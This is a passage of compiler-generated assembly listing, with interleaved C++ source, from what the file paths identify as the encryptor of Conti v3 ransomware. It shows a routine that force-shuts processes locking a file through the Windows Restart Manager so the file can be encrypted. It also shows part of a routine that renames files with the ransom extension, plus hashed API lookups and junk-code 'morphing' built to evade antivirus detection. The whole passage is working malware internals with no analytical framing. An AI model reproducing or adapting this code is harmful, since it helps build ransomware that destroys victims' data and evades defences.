  00290	8b 45 80	 mov	 eax, DWORD PTR nProcInfoNeeded$3[rbp-256]
  00293	85 c0		 test	 eax, eax
  00295	0f 84 58 01 00
	00		 je	 $LN12@KillFileOw

; 600  : 
; 601  : 				pRmEndSession(dwSession);
; 602  : 				return FALSE;
; 603  : 
; 604  : 			}
; 605  : 
; 606  : 			ProcessInfo = (PRM_PROCESS_INFO)memory::Alloc(sizeof(RM_PROCESS_INFO) * nProcInfoNeeded);

  0029b	48 69 c8 9c 02
	00 00		 imul	 rcx, rax, 668		; 0000029cH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 12   : 	return malloc(Size);

  002a2	e8 00 00 00 00	 call	 malloc
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 607  : 			if (!ProcessInfo) {

  002a7	8b 7d 98	 mov	 edi, DWORD PTR dwSession$[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 12   : 	return malloc(Size);

  002aa	48 8b f0	 mov	 rsi, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 607  : 			if (!ProcessInfo) {

  002ad	8d 53 13	 lea	 edx, QWORD PTR [rbx+19]
  002b0	48 85 c0	 test	 rax, rax
  002b3	0f 84 42 01 00
	00		 je	 $LN215@KillFileOw

; 614  : 			nProcInfo = nProcInfoNeeded;

  002b9	8b 45 80	 mov	 eax, DWORD PTR nProcInfoNeeded$3[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 736  : 	pFunction = (DWORD(WINAPI*)(DWORD, UINT*, UINT*, RM_PROCESS_INFO*, LPDWORD))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0x462fab0f, 45);//GetProcAddress(hRstrtmgr, OBFA("RmGetList"));

  002bc	44 8d 4b 2d	 lea	 r9d, QWORD PTR [rbx+45]
  002c0	41 b8 0f ab 2f
	46		 mov	 r8d, 1177529103		; 462fab0fH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 614  : 			nProcInfo = nProcInfoNeeded;

  002c6	89 45 9c	 mov	 DWORD PTR nProcInfo$5[rbp-256], eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 736  : 	pFunction = (DWORD(WINAPI*)(DWORD, UINT*, UINT*, RM_PROCESS_INFO*, LPDWORD))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0x462fab0f, 45);//GetProcAddress(hRstrtmgr, OBFA("RmGetList"));

  002c9	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 737  : 	return pFunction(dwSessionHandle, pnProcInfoNeeded, pnProcInfo, rgAffectedApps, lpdwRebootReasons);

  002ce	48 8d 4d a0	 lea	 rcx, QWORD PTR dwReason$6[rbp-256]
  002d2	4c 8b ce	 mov	 r9, rsi
  002d5	48 89 4c 24 20	 mov	 QWORD PTR [rsp+32], rcx
  002da	4c 8d 45 9c	 lea	 r8, QWORD PTR nProcInfo$5[rbp-256]
  002de	8b cf		 mov	 ecx, edi
  002e0	48 8d 55 80	 lea	 rdx, QWORD PTR nProcInfoNeeded$3[rbp-256]
  002e4	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 618  : 			if (ret != ERROR_SUCCESS || !nProcInfoNeeded) {

  002e6	85 c0		 test	 eax, eax
  002e8	0f 85 fd 00 00
	00		 jne	 $LN15@KillFileOw
  002ee	39 5d 80	 cmp	 DWORD PTR nProcInfoNeeded$3[rbp-256], ebx
  002f1	0f 84 f4 00 00
	00		 je	 $LN15@KillFileOw
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 109  : 	pFunction = (HANDLE(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x3cd723f8, 103);//GetProcAddress(hKernel32, OBFA("GetCurrentProcess"));

  002f7	8d 53 0f	 lea	 edx, QWORD PTR [rbx+15]
  002fa	41 b8 f8 23 d7
	3c		 mov	 r8d, 1020732408		; 3cd723f8H
  00300	44 8d 4b 67	 lea	 r9d, QWORD PTR [rbx+103]
  00304	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 110  : 	return pFunction();

  00309	ff d0		 call	 rax

; 140  : 	pFunction = (DWORD(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x71114e08, 100);//GetProcAddress(hKernel32, OBFA("GetProcessId"));

  0030b	8d 53 0f	 lea	 edx, QWORD PTR [rbx+15]
  0030e	41 b8 08 4e 11
	71		 mov	 r8d, 1896959496		; 71114e08H
  00314	44 8d 4b 64	 lea	 r9d, QWORD PTR [rbx+100]

; 110  : 	return pFunction();

  00318	48 8b f8	 mov	 rdi, rax

; 140  : 	pFunction = (DWORD(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x71114e08, 100);//GetProcAddress(hKernel32, OBFA("GetProcessId"));

  0031b	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 141  : 	return pFunction(Process);

  00320	48 8b cf	 mov	 rcx, rdi
  00323	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 628  : 			for (INT i = 0; i < nProcInfo; i++) {

  00325	44 8b 45 9c	 mov	 r8d, DWORD PTR nProcInfo$5[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 141  : 	return pFunction(Process);

  00329	44 8b d0	 mov	 r10d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 628  : 			for (INT i = 0; i < nProcInfo; i++) {

  0032c	8b fb		 mov	 edi, ebx
  0032e	45 85 c0	 test	 r8d, r8d
  00331	74 3f		 je	 SHORT $LN3@KillFileOw

; 631  : 
; 632  : 					memory::Free(ProcessInfo);
; 633  : 					pRmEndSession(dwSession);
; 634  : 					return FALSE;
; 635  : 
; 636  : 				}
; 637  : 
; 638  : 				process_killer::PPID Pid = NULL;
; 639  : 				TAILQ_FOREACH(Pid, g_WhitelistPids, Entries) {

  00333	4c 8b 0d 00 00
	00 00		 mov	 r9, QWORD PTR ?g_WhitelistPids@@3PEAUPID_LIST@process_killer@@EA ; g_WhitelistPids
  0033a	48 8b d6	 mov	 rdx, rsi
  0033d	0f 1f 00	 npad	 3
$LL4@KillFileOw:

; 629  : 
; 630  : 				if (ProcessInfo[i].Process.dwProcessId == ProcessId) {

  00340	8b 0a		 mov	 ecx, DWORD PTR [rdx]
  00342	41 3b ca	 cmp	 ecx, r10d
  00345	0f 84 a0 00 00
	00		 je	 $LN15@KillFileOw

; 631  : 
; 632  : 					memory::Free(ProcessInfo);
; 633  : 					pRmEndSession(dwSession);
; 634  : 					return FALSE;
; 635  : 
; 636  : 				}
; 637  : 
; 638  : 				process_killer::PPID Pid = NULL;
; 639  : 				TAILQ_FOREACH(Pid, g_WhitelistPids, Entries) {

  0034b	49 8b 01	 mov	 rax, QWORD PTR [r9]
  0034e	48 85 c0	 test	 rax, rax
  00351	74 11		 je	 SHORT $LN2@KillFileOw
$LL7@KillFileOw:

; 640  : 
; 641  : 					if (ProcessInfo[i].Process.dwProcessId == Pid->dwProcessId) {

  00353	3b 08		 cmp	 ecx, DWORD PTR [rax]
  00355	0f 84 90 00 00
	00		 je	 $LN15@KillFileOw

; 631  : 
; 632  : 					memory::Free(ProcessInfo);
; 633  : 					pRmEndSession(dwSession);
; 634  : 					return FALSE;
; 635  : 
; 636  : 				}
; 637  : 
; 638  : 				process_killer::PPID Pid = NULL;
; 639  : 				TAILQ_FOREACH(Pid, g_WhitelistPids, Entries) {

  0035b	48 8b 40 08	 mov	 rax, QWORD PTR [rax+8]
  0035f	48 85 c0	 test	 rax, rax
  00362	75 ef		 jne	 SHORT $LL7@KillFileOw
$LN2@KillFileOw:

; 628  : 			for (INT i = 0; i < nProcInfo; i++) {

  00364	ff c7		 inc	 edi
  00366	48 81 c2 9c 02
	00 00		 add	 rdx, 668		; 0000029cH
  0036d	41 3b f8	 cmp	 edi, r8d
  00370	72 ce		 jb	 SHORT $LL4@KillFileOw
$LN3@KillFileOw:

; 653  : 			Result = pRmShutdown(dwSession, RmForceShutdown, NULL) == ERROR_SUCCESS;

  00372	8b 7d 98	 mov	 edi, DWORD PTR dwSession$[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 763  : 	pFunction = (DWORD(WINAPI*)(DWORD, ULONG, RM_WRITE_STATUS_CALLBACK))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0xe7d62d41, 43);//GetProcAddress(hRstrtmgr, OBFA("RmShutdown"));

  00375	ba 13 00 00 00	 mov	 edx, 19
  0037a	41 b8 41 2d d6
	e7		 mov	 r8d, -405394111		; e7d62d41H
  00380	44 8d 4a 18	 lea	 r9d, QWORD PTR [rdx+24]
  00384	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 764  : 	return pFunction(dwSessionHandle, lActionFlags, fnStatus);

  00389	45 33 c0	 xor	 r8d, r8d
  0038c	8b cf		 mov	 ecx, edi
  0038e	41 8d 50 01	 lea	 edx, QWORD PTR [r8+1]
  00392	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 653  : 			Result = pRmShutdown(dwSession, RmForceShutdown, NULL) == ERROR_SUCCESS;

  00394	85 c0		 test	 eax, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 17   : 	free(Memory);

  00396	48 8b ce	 mov	 rcx, rsi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 653  : 			Result = pRmShutdown(dwSession, RmForceShutdown, NULL) == ERROR_SUCCESS;

  00399	0f 94 c3	 sete	 bl
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 17   : 	free(Memory);

  0039c	e8 00 00 00 00	 call	 free
$LN10@KillFileOw:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 658  : 		pRmEndSession(dwSession);

  003a1	8b 7d 98	 mov	 edi, DWORD PTR dwSession$[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 711  : 	pFunction = (DWORD(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0xa8f528dd, 47);//GetProcAddress(hRstrtmgr, OBFA("RmEndSession"));

  003a4	ba 13 00 00 00	 mov	 edx, 19
  003a9	41 b8 dd 28 f5
	a8		 mov	 r8d, -1460328227	; a8f528ddH
  003af	44 8d 4a 1c	 lea	 r9d, QWORD PTR [rdx+28]
  003b3	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 712  : 	return pFunction(dwSessionHandle);

  003b8	8b cf		 mov	 ecx, edi
  003ba	ff d0		 call	 rax
$LN9@KillFileOw:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 661  : 	return Result;

  003bc	8b c3		 mov	 eax, ebx
$LN214@KillFileOw:
  003be	48 8b b4 24 28
	01 00 00	 mov	 rsi, QWORD PTR [rsp+296]
  003c6	48 8b bc 24 30
	01 00 00	 mov	 rdi, QWORD PTR [rsp+304]
$LN1@KillFileOw:

; 662  : }

  003ce	48 8b 4d 00	 mov	 rcx, QWORD PTR __$ArrayPad$[rbp-256]
  003d2	48 33 cc	 xor	 rcx, rsp
  003d5	e8 00 00 00 00	 call	 __security_check_cookie
  003da	48 8b 9c 24 38
	01 00 00	 mov	 rbx, QWORD PTR [rsp+312]
  003e2	48 81 c4 10 01
	00 00		 add	 rsp, 272		; 00000110H
  003e9	5d		 pop	 rbp
  003ea	c3		 ret	 0
$LN15@KillFileOw:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 17   : 	free(Memory);

  003eb	48 8b ce	 mov	 rcx, rsi
  003ee	e8 00 00 00 00	 call	 free
$LN12@KillFileOw:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 621  : 				pRmEndSession(dwSession);

  003f3	8b 7d 98	 mov	 edi, DWORD PTR dwSession$[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 711  : 	pFunction = (DWORD(WINAPI*)(DWORD))getapi::GetProcAddressEx2(NULL, RSTRTMGR_MODULE_ID, 0xa8f528dd, 47);//GetProcAddress(hRstrtmgr, OBFA("RmEndSession"));

  003f6	ba 13 00 00 00	 mov	 edx, 19
$LN215@KillFileOw:
  003fb	41 b9 2f 00 00
	00		 mov	 r9d, 47			; 0000002fH
  00401	41 b8 dd 28 f5
	a8		 mov	 r8d, -1460328227	; a8f528ddH
  00407	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 712  : 	return pFunction(dwSessionHandle);

  0040c	8b cf		 mov	 ecx, edi
  0040e	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 622  : 				return FALSE;

  00410	33 c0		 xor	 eax, eax
  00412	eb aa		 jmp	 SHORT $LN214@KillFileOw
?KillFileOwner@@YAHPEB_W@Z ENDP				; KillFileOwner
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp
;	COMDAT ?ChangeFileName@cryptor@@YAHPEB_W@Z
_TEXT	SEGMENT
OldName$ = 48
_morph_var$1 = 56
_morph_var$2 = 56
_morph_var$3 = 56
?ChangeFileName@cryptor@@YAHPEB_W@Z PROC		; cryptor::ChangeFileName, COMDAT

; 667  : {

$LN175:
  00000	48 89 5c 24 18	 mov	 QWORD PTR [rsp+24], rbx
  00005	56		 push	 rsi
  00006	48 83 ec 20	 sub	 rsp, 32			; 00000020H
  0000a	48 8b f1	 mov	 rsi, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 12   : 	return malloc(Size);

  0000d	b9 d7 7f 00 00	 mov	 ecx, 32727		; 00007fd7H
  00012	e8 00 00 00 00	 call	 malloc
  00017	48 8b d8	 mov	 rbx, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 669  : 	if (!NewName) {

  0001a	48 85 c0	 test	 rax, rax
  0001d	75 0b		 jne	 SHORT $LN2@ChangeFile

; 686  : }

  0001f	48 8b 5c 24 40	 mov	 rbx, QWORD PTR [rsp+64]
  00024	48 83 c4 20	 add	 rsp, 32			; 00000020H
  00028	5e		 pop	 rsi
  00029	c3		 ret	 0
$LN2@ChangeFile:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0002a	c7 44 24 38 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$3[rsp], 1547201 ; 00179bc1H

; 41   : #else
; 42   : 	volatile int _morph_var = a;
; 43   : #endif
; 44   : 
; 45   : 	//      ( ) ,  .
; 46   : 	//   ,      ,      ,
; 47   : 	//  .  ,           .
; 48   : 	if (_morph_var % 3) {

  00032	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00037	8b 4c 24 38	 mov	 ecx, DWORD PTR _morph_var$3[rsp]
  0003b	f7 e9		 imul	 ecx
  0003d	48 89 7c 24 30	 mov	 QWORD PTR [rsp+48], rdi
  00042	bf 02 00 00 00	 mov	 edi, 2
  00047	8b c2		 mov	 eax, edx
  00049	c1 e8 1f	 shr	 eax, 31
  0004c	03 d0		 add	 edx, eax
  0004e	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00051	3b c8		 cmp	 ecx, eax
  00053	74 4d		 je	 SHORT $LN17@ChangeFile

; 49   : 		_morph_var += (int)a + 2;

  00055	8b 4c 24 38	 mov	 ecx, DWORD PTR _morph_var$3[rsp]
  00059	03 cf		 add	 ecx, edi
  0005b	03 cb		 add	 ecx, ebx
  0005d	89 4c 24 38	 mov	 DWORD PTR _morph_var$3[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00061	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$3[rsp]
  00065	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0006a	7d 07		 jge	 SHORT $LN133@ChangeFile
  0006c	ff c8		 dec	 eax
  0006e	83 c8 fc	 or	 eax, -4
  00071	ff c0		 inc	 eax
$LN133@ChangeFile:
  00073	85 c0		 test	 eax, eax
  00075	75 7c		 jne	 SHORT $LN16@ChangeFile
  00077	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL9@ChangeFile:
  00080	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$3[rsp]
  00084	ff c0		 inc	 eax
  00086	89 44 24 38	 mov	 DWORD PTR _morph_var$3[rsp], eax
  0008a	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$3[rsp]
  0008e	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00093	7d 07		 jge	 SHORT $LN132@ChangeFile
  00095	ff c8		 dec	 eax
  00097	83 c8 fc	 or	 eax, -4
  0009a	ff c0		 inc	 eax
$LN132@ChangeFile:
  0009c	85 c0		 test	 eax, eax
  0009e	74 e0		 je	 SHORT $LL9@ChangeFile

; 51   : 	}

  000a0	eb 51		 jmp	 SHORT $LN16@ChangeFile
$LN17@ChangeFile:

; 52   : 	else if (_morph_var % 2) {

  000a2	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$3[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  000a6	8b cf		 mov	 ecx, edi
  000a8	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$3[rsp]
  000ac	2b cb		 sub	 ecx, ebx
  000ae	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  000b0	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  000b5	89 4c 24 38	 mov	 DWORD PTR _morph_var$3[rsp], ecx
  000b9	8b 4c 24 38	 mov	 ecx, DWORD PTR _morph_var$3[rsp]
  000bd	f7 e9		 imul	 ecx
  000bf	8b c2		 mov	 eax, edx
  000c1	c1 e8 1f	 shr	 eax, 31
  000c4	03 d0		 add	 edx, eax
  000c6	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  000c9	3b c8		 cmp	 ecx, eax
  000cb	75 26		 jne	 SHORT $LN16@ChangeFile
  000cd	0f 1f 00	 npad	 3
$LL11@ChangeFile:
  000d0	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$3[rsp]
  000d4	ff c0		 inc	 eax
  000d6	89 44 24 38	 mov	 DWORD PTR _morph_var$3[rsp], eax
  000da	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  000df	8b 4c 24 38	 mov	 ecx, DWORD PTR _morph_var$3[rsp]
  000e3	f7 e9		 imul	 ecx
  000e5	8b c2		 mov	 eax, edx
  000e7	c1 e8 1f	 shr	 eax, 31
  000ea	03 d0		 add	 edx, eax
  000ec	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  000ef	3b c8		 cmp	 ecx, eax
  000f1	74 dd		 je	 SHORT $LL11@ChangeFile
$LN16@ChangeFile:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 277  : 	pFunction = (LPWSTR(WINAPI*)(LPWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x3fd9cc6a, 87);//GetProcAddress(hKernel32, OBFA("lstrcpyW"));

  000f3	ba 0f 00 00 00	 mov	 edx, 15
  000f8	41 b8 6a cc d9
	3f		 mov	 r8d, 1071238250		; 3fd9cc6aH
  000fe	44 8d 4a 48	 lea	 r9d, QWORD PTR [rdx+72]
  00102	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 278  : 	return pFunction(lpString1, lpString2);

  00107	48 8b d6	 mov	 rdx, rsi
  0010a	48 8b cb	 mov	 rcx, rbx
  0010d	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0010f	c7 44 24 38 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$2[rsp], 1547201 ; 00179bc1H

; 41   : #else
; 42   : 	volatile int _morph_var = a;
; 43   : #endif
; 44   : 
; 45   : 	//      ( ) ,  .
; 46   : 	//   ,      ,      ,
; 47   : 	//  .  ,           .
; 48   : 	if (_morph_var % 3) {

  00117	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0011c	8b 4c 24 38	 mov	 ecx, DWORD PTR _morph_var$2[rsp]
  00120	f7 e9		 imul	 ecx
  00122	8b c2		 mov	 eax, edx
  00124	c1 e8 1f	 shr	 eax, 31
  00127	03 d0		 add	 edx, eax
  00129	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0012c	3b c8		 cmp	 ecx, eax
  0012e	74 44		 je	 SHORT $LN42@ChangeFile

; 49   : 		_morph_var += (int)a + 2;

  00130	8b 4c 24 38	 mov	 ecx, DWORD PTR _morph_var$2[rsp]
  00134	03 cf		 add	 ecx, edi
  00136	03 cb		 add	 ecx, ebx
  00138	89 4c 24 38	 mov	 DWORD PTR _morph_var$2[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0013c	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$2[rsp]
  00140	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00145	7d 07		 jge	 SHORT $LN130@ChangeFile
  00147	ff c8		 dec	 eax
  00149	83 c8 fc	 or	 eax, -4
  0014c	ff c0		 inc	 eax
$LN130@ChangeFile:
  0014e	85 c0		 test	 eax, eax
  00150	75 71		 jne	 SHORT $LN41@ChangeFile
$LL34@ChangeFile:
  00152	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$2[rsp]
  00156	ff c0		 inc	 eax
  00158	89 44 24 38	 mov	 DWORD PTR _morph_var$2[rsp], eax
  0015c	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$2[rsp]
  00160	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00165	7d 07		 jge	 SHORT $LN129@ChangeFile
  00167	ff c8		 dec	 eax
  00169	83 c8 fc	 or	 eax, -4
  0016c	ff c0		 inc	 eax
$LN129@ChangeFile:
  0016e	85 c0		 test	 eax, eax
  00170	74 e0		 je	 SHORT $LL34@ChangeFile

; 51   : 	}

  00172	eb 4f		 jmp	 SHORT $LN41@ChangeFile
$LN42@ChangeFile:

; 52   : 	else if (_morph_var % 2) {

  00174	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$2[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  00178	8b cf		 mov	 ecx, edi
  0017a	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$2[rsp]
  0017e	2b cb		 sub	 ecx, ebx
  00180	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00182	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00187	89 4c 24 38	 mov	 DWORD PTR _morph_var$2[rsp], ecx
  0018b	8b 4c 24 38	 mov	 ecx, DWORD PTR _morph_var$2[rsp]
  0018f	f7 e9		 imul	 ecx
  00191	8b c2		 mov	 eax, edx
  00193	c1 e8 1f	 shr	 eax, 31
  00196	03 d0		 add	 edx, eax
  00198	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0019b	3b c8		 cmp	 ecx, eax
  0019d	75 24		 jne	 SHORT $LN41@ChangeFile
  0019f	90		 npad	 1
$LL36@ChangeFile:
  001a0	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$2[rsp]
  001a4	ff c0		 inc	 eax
  001a6	89 44 24 38	 mov	 DWORD PTR _morph_var$2[rsp], eax
  001aa	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  001af	8b 4c 24 38	 mov	 ecx, DWORD PTR _morph_var$2[rsp]
  001b3	f7 e9		 imul	 ecx
  001b5	8b c2		 mov	 eax, edx
  001b7	c1 e8 1f	 shr	 eax, 31
  001ba	03 d0		 add	 edx, eax
  001bc	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  001bf	3b c8		 cmp	 ecx, eax
  001c1	74 dd		 je	 SHORT $LL36@ChangeFile
$LN41@ChangeFile:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 219  : 	pFunction = (LPWSTR(WINAPI*)(LPWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd1da9915, 92);//GetProcAddress(hKernel32, OBFA("lstrcatW"));

  001c3	ba 0f 00 00 00	 mov	 edx, 15
  001c8	41 b8 15 99 da
	d1		 mov	 r8d, -774203115		; d1da9915H
  001ce	44 8d 4a 4d	 lea	 r9d, QWORD PTR [rdx+77]
  001d2	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 220  : 	return pFunction(lpString1, lpString2);

  001d7	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:?g_Extention@@3PA_WA ; g_Extention
  001de	48 8b cb	 mov	 rcx, rbx
  001e1	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  001e3	c7 44 24 38 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$1[rsp], 1547201 ; 00179bc1H

; 41   : #else
; 42   : 	volatile int _morph_var = a;
; 43   : #endif
; 44   : 
; 45   : 	//      ( ) ,  .
; 46   : 	//   ,      ,      ,
; 47   : 	//  .  ,           .
; 48   : 	if (_morph_var % 3) {

  001eb	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  001f0	8b 4c 24 38	 mov	 ecx, DWORD PTR _morph_var$1[rsp]
  001f4	f7 e9		 imul	 ecx
  001f6	8b c2		 mov	 eax, edx
  001f8	c1 e8 1f	 shr	 eax, 31
  001fb	03 d0		 add	 edx, eax
  001fd	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00200	3b c8		 cmp	 ecx, eax
  00202	74 4e		 je	 SHORT $LN67@ChangeFile

; 49   : 		_morph_var += (int)a + 2;

  00204	8b 4c 24 38	 mov	 ecx, DWORD PTR _morph_var$1[rsp]
  00208	03 cf		 add	 ecx, edi
  0020a	03 ce		 add	 ecx, esi
  0020c	89 4c 24 38	 mov	 DWORD PTR _morph_var$1[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00210	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$1[rsp]
  00214	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00219	7d 07		 jge	 SHORT $LN127@ChangeFile
  0021b	ff c8		 dec	 eax
  0021d	83 c8 fc	 or	 eax, -4
  00220	ff c0		 inc	 eax
$LN127@ChangeFile:
  00222	85 c0		 test	 eax, eax
  00224	75 7d		 jne	 SHORT $LN66@ChangeFile
  00226	66 66 0f 1f 84
	00 00 00 00 00	 npad	 10
$LL59@ChangeFile:
  00230	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$1[rsp]
  00234	ff c0		 inc	 eax
  00236	89 44 24 38	 mov	 DWORD PTR _morph_var$1[rsp], eax
  0023a	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$1[rsp]
  0023e	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00243	7d 07		 jge	 SHORT $LN126@ChangeFile
  00245	ff c8		 dec	 eax
  00247	83 c8 fc	 or	 eax, -4
  0024a	ff c0		 inc	 eax
$LN126@ChangeFile:
  0024c	85 c0		 test	 eax, eax
  0024e	74 e0		 je	 SHORT $LL59@ChangeFile

; 51   : 	}

  00250	eb 51		 jmp	 SHORT $LN66@ChangeFile
$LN67@ChangeFile:

; 52   : 	else if (_morph_var % 2) {

  00252	8b 44 24 38	 mov	 eax, DWORD PTR _morph_var$1[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  00256	2b fe		 sub	 edi, esi
